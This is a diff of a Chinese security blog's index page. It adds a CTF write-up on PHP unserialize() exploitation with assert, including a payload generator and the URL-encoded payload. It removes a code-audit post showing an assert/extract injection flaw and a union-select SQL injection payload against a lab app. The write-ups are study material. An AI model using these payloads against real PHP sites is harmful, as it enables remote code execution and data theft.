@@ -182,6 +182,105 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/05/06/NPUCTF2020-ReadlezPHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/05/06/NPUCTF2020-ReadlezPHP/" class="post-title-link" itemprop="url">[NPUCTF2020]ReadlezPHP</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-05-06 21:40:05 / 修改时间：21:41:03" itemprop="dateCreated datePublished" datetime="2020-05-06T21:40:05+08:00">2020-05-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF复现</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="知识加固"><a href="#知识加固" class="headerlink" title="知识加固"></a>知识加固</h3><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p><code>__construct()</code>函数：在创建对象时被调用。是在调用反序列化函数那刻，对象就被创建了，同时调用了<strong>construct魔法函数，而给对象属性赋值发生在更后面，所以，就算</strong>construct函数里面有一些赋值操作，这也并不影响我们传值。<br>当然同理<code>__destruct()</code>就是摧毁前的最后一步而已。</p>
+<h4 id="eval和assert"><a href="#eval和assert" class="headerlink" title="eval和assert"></a>eval和assert</h4><p>二者都可以执行PHP语句。只不过是，eval规范更加严格一些，必须符合PHP代码要求。而assert则没有那么严格，执行PHP表达式即可。</p>
+<h5 id="eval定义和用法"><a href="#eval定义和用法" class="headerlink" title="eval定义和用法"></a>eval定义和用法</h5><p>函数把字符串按照 PHP 代码来计算，该字符串必须是合法的 PHP 代码，且<strong>必须以分号结尾</strong>。<br>如eval(“echo 1;”)</p>
+<ul>
+<li>eval() 函数把字符串按照 PHP 代码来计算（计算=执行）。</li>
+<li>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</li>
+<li>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false</li>
+</ul>
+<h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>&emsp;功能是判断一个表达式是否成立，返回true or false，重点是函数会执行此表达式。如果表达式为函数如assert(“echo(1)”)，则会输出1，而如果为assert(“echo 1;”)则不会有输出。</p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
+<li>打开题目查看源码发现指向<code>./time.php?source</code>的隐藏a标签，我们直接访问可以得到一个源码。如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a &#x3D; $this-&gt;a;</span><br><span class="line">        $b &#x3D; $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;source&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure></li>
+<li>很显然我们可以利用反序列化来执行命令或函数，经测试发现assert可用，且执行phpinfo()即可得到flag。</li>
+<li>我们输入执行以下代码得到payload：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a&#x3D;&quot;phpinfo();&quot;;</span><br><span class="line">    public $b&#x3D;&quot;assert&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp; </span><br><span class="line">echo urlencode(serialize($c));</span><br></pre></td></tr></table></figure>
+最后payload为;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;time.php?data&#x3D;O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A10%3A&quot;phpinfo()%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;</span><br></pre></td></tr></table></figure>
+然后在这个phpinfo页面搜索<code>flag{</code>就可以看到flag了。<br><a href="https://pic.downk.cc/item/5eb2be19c2a9a83be542e479.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5eb2be19c2a9a83be542e479.jpg" alt=""></a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/05/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%89%B9%E5%AE%9A%E5%9C%BA%E5%90%88%E4%B8%8Baddslashes%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -670,109 +769,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/05/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%A8%8B%E5%BA%8F%E6%9C%AA%E6%81%B0%E5%BD%93exit%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="信安小蚂蚁">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="信安小蚂蚁">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/05/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%A8%8B%E5%BA%8F%E6%9C%AA%E6%81%B0%E5%BD%93exit%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">代码审计--程序未恰当exit导致的问题</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-05-03 10:49:20 / 修改时间：10:50:18" itemprop="dateCreated datePublished" datetime="2020-05-03T10:49:20+08:00">2020-05-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" itemprop="url" rel="index">
-                    <span itemprop="name">基础积累</span>
-                  </a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.8k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>10 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="漏洞源码"><a href="#漏洞源码" class="headerlink" title="漏洞源码"></a>漏洞源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">function goAway() &#123;</span><br><span class="line">  error_log(&quot;Hacking attempt.&quot;);</span><br><span class="line">  header(&#39;Location: &#x2F;error&#x2F;&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">  goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!assert(&quot;(int)$pi &#x3D;&#x3D; 3&quot;)) &#123;</span><br><span class="line">  echo &quot;This is not pi.&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &quot;This might be pi.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h3><p>我们发现，当程序进入 goAway 函数以后并没有直接退出中止程序，而是直接转到<code>/error/</code> 但其实程序还是会接着往下执行的，但执行到<code>if (!assert(&quot;(int)$pi == 3&quot;))</code>时就是我们的利用点了。我们假如我们传入$pi 为 <code>phpinfo()</code> 它还是会被执行的，虽然我们浏览器可能看不到结果因为此时已经跳转到<code>/error/</code>页面了，但是我们bp抓包的话还是可以看到的。<br>那我们怎么给<code>$pi</code>赋值呢？其实extract就可以达到这个效果<br>。它是<strong>把数组中的剪值对注册成变量</strong> 官方定义如下：</p>
-<blockquote>
-<p>extract ：(PHP 4, PHP 5, PHP 7)   </p>
-<p><strong>功能</strong>：从数组中将变量导入到当前的符号表</p>
-<p><strong>定义</strong>： int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</p>
-</blockquote>
-<h3 id="CTF题目源码"><a href="#CTF题目源码" class="headerlink" title="CTF题目源码"></a>CTF题目源码</h3><p>index.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; index.php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line">function stophack($string)&#123;</span><br><span class="line">    if(is_array($string))&#123;</span><br><span class="line">        foreach($string as $key &#x3D;&gt; $val) &#123;</span><br><span class="line">            $string[$key] &#x3D; stophack($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $raw &#x3D; $string;</span><br><span class="line">        $replace &#x3D; array(&quot;\\&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;&#x2F;&quot;,&quot;*&quot;,&quot;%5C&quot;,&quot;%22&quot;,&quot;%27&quot;,&quot;%2A&quot;,&quot;~&quot;,&quot;insert&quot;,&quot;update&quot;,&quot;delete&quot;,&quot;into&quot;,&quot;load_file&quot;,&quot;outfile&quot;,&quot;sleep&quot;,);</span><br><span class="line">        $string &#x3D; str_ireplace($replace, &quot;HongRi&quot;, $string);</span><br><span class="line">        $string &#x3D; strip_tags($string);</span><br><span class="line">        if($raw!&#x3D;$string)&#123;</span><br><span class="line">            error_log(&quot;Hacking attempt.&quot;);</span><br><span class="line">            header(&#39;Location: &#x2F;error&#x2F;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        return trim($string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$conn &#x3D; new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;连接失败: &quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;id&#39;]) &amp;&amp; $_GET[&#39;id&#39;])&#123;</span><br><span class="line">    $id &#x3D; stophack($_GET[&#39;id&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;SELECT * FROM students WHERE id&#x3D;$id&quot;;</span><br><span class="line">    $result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">    if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">        $row &#x3D; $result-&gt;fetch_assoc();</span><br><span class="line">        echo &#39;&lt;center&gt;&lt;h1&gt;查询结果为：&lt;&#x2F;h1&gt;&lt;pre&gt;&#39;.&lt;&lt;&lt;EOF</span><br><span class="line">        +----+---------+--------------------+-------+</span><br><span class="line">        | id | name    | email              | score |</span><br><span class="line">        +----+---------+--------------------+-------+</span><br><span class="line">        |  &#123;$row[&#39;id&#39;]&#125; | &#123;$row[&#39;name&#39;]&#125;   | &#123;$row[&#39;email&#39;]&#125;   |   &#123;$row[&#39;score&#39;]&#125; |</span><br><span class="line">        +----+---------+--------------------+-------+&lt;&#x2F;center&gt;</span><br><span class="line">EOF;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else die(&quot;你所查询的对象id值不能为空！&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>config.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; config.php</span><br><span class="line">&lt;?php  </span><br><span class="line">$servername &#x3D; &quot;localhost&quot;;</span><br><span class="line">$username &#x3D; &quot;fire&quot;;</span><br><span class="line">$password &#x3D; &quot;fire&quot;;</span><br><span class="line">$dbname &#x3D; &quot;day10&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>SQL语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 搭建CTF环境使用的sql语句</span><br><span class="line">create database day10;</span><br><span class="line">use day10;</span><br><span class="line">create table students (</span><br><span class="line">id int(6) unsigned auto_increment primary key,</span><br><span class="line">name varchar(20) not null,</span><br><span class="line">email varchar(30) not null,</span><br><span class="line">score int(8) unsigned not null );</span><br><span class="line"></span><br><span class="line">INSERT INTO students VALUES(1,&#39;Lucia&#39;,&#39;Lucia@hongri.com&#39;,100);</span><br><span class="line">INSERT INTO students VALUES(2,&#39;Danny&#39;,&#39;Danny@hongri.com&#39;,59);</span><br><span class="line">INSERT INTO students VALUES(3,&#39;Alina&#39;,&#39;Alina@hongri.com&#39;,66);</span><br><span class="line">INSERT INTO students VALUES(4,&#39;Jameson&#39;,&#39;Jameson@hongri.com&#39;,13);</span><br><span class="line">INSERT INTO students VALUES(5,&#39;Allie&#39;,&#39;Allie@hongri.com&#39;,88);</span><br><span class="line"></span><br><span class="line">create table flag(flag varchar(30) not null);</span><br><span class="line">INSERT INTO flag VALUES(&#39;HRCTF&#123;tim3_blind_Sql&#125;&#39;);</span><br></pre></td></tr></table></figure>
-
-<h3 id="CTF题解"><a href="#CTF题解" class="headerlink" title="CTF题解"></a>CTF题解</h3><p>简单的看一下index.php stophack中：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace &#x3D; array(&quot;\\&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;&#x2F;&quot;,&quot;*&quot;,&quot;%5C&quot;,&quot;%22&quot;,&quot;%27&quot;,&quot;%2A&quot;,&quot;~&quot;,&quot;insert&quot;,&quot;update&quot;,&quot;delete&quot;,&quot;into&quot;,&quot;load_file&quot;,&quot;outfile&quot;,&quot;sleep&quot;,);</span><br></pre></td></tr></table></figure>
-<p>并没有进行过滤 <code>select from union</code>那我们完全是可以直接出flag的呀，paylaod如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1+union+select+1,2,3,flag+from+flag</span><br></pre></td></tr></table></figure>
-<p>但是很显然，题目的本意不在于此。看了红日的题解，他们使用 <strong>benchmark</strong> 来进行盲注，那还不也是利用了过滤条件不够苛刻而已。那我就不参试了。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -844,18 +840,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-count">135</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-count">86</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
